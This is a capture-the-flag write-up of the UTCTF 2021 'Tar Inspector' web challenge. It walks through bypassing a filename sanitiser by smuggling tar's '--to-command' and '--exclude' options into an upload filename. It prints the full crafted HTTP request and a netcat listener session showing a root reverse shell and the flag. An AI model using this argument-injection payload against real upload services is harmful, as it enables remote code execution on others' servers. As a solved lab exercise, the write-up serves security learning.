## (Web) Tar Inspector [994 pts]

> Tar Inspector challenge is get the shell using RCE and read the flag

Many people asked for a hint and the contest provided the code for the secure_filename() function. So first, I'll see `secure_filename()`.

```python
# creates a secured version of the filename
def secure_filename(filename):
    # strip extension and any sneaky path traversal stuff
    filename = filename[:-4]
    filename = os.path.basename(filename)
    # escape shell metacharacters
    filename = re.sub("(!|\$|#|&|\"|\'|\(|\)|\||<|>|`|\\\|;)", r"\\\1", filename)
    filename = re.sub("\n", "", filename)
    # add extension
    filename += '__'+hex(randrange(10000000))[2:]+'.tar'
    return filename
```
You can see that the secure_filename() function gets the file name excluding the extension, escapes all special characters, and creates a new file name by including a random value between the file names.

![](https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/1.png?raw=true)

Go into the challenge and you can will see the file upload function.

![](https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/2.png?raw=true)

If you upload any file, you can see that only the `.tar` extension can be uploaded. Probably I need to make RCE happen when i unpack the tar file. When unpack the tar file, I can execute file `using --to-command` option :)

- Scenario

1. I compress the reverse shell code to tar file and I upload in server.
2. If you upload the tar file, you can see the newly created file name.
3. If you upload the created file again by name, it will be unpack and the file will be executed. Obviously, you need to add the `--to-command` option at this time.
4. And since the last in the file must be `.tar`, you can bypass it using the `--exclude` option.

![](https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/3.png?raw=true)

After uploading the tar file, you can see a file named `pocas__bf9d0.tar` was created :) Now, When you unpack the `pocas__bf9d0.tar` file, you can execute the reverse shell file.

```
POST /upload HTTP/1.1
Host: web2.utctf.live:8123
Content-Length: 1566
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCvRhaPJjhVCXGrN
Connection: close

------WebKitFormBoundarytCvRhaPJjhVCXGrN
Content-Disposition: form-data; name="file"; filename="pocas__bf9d0.tar --to-command=python3${IFS}pocas.py --exclude=pocas.tar"
Content-Type: application/x-tar


------WebKitFormBoundarytCvRhaPJjhVCXGrN--

```
I used the `--to-command`/`--exclude` option as above.

```
root@py:~# nc -lp 80
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/tmp/extracts
# cat /flag.txt
utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}
#
```
You can see that it is unpacked, and the file is executed to get the shell :)

```
utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}
```
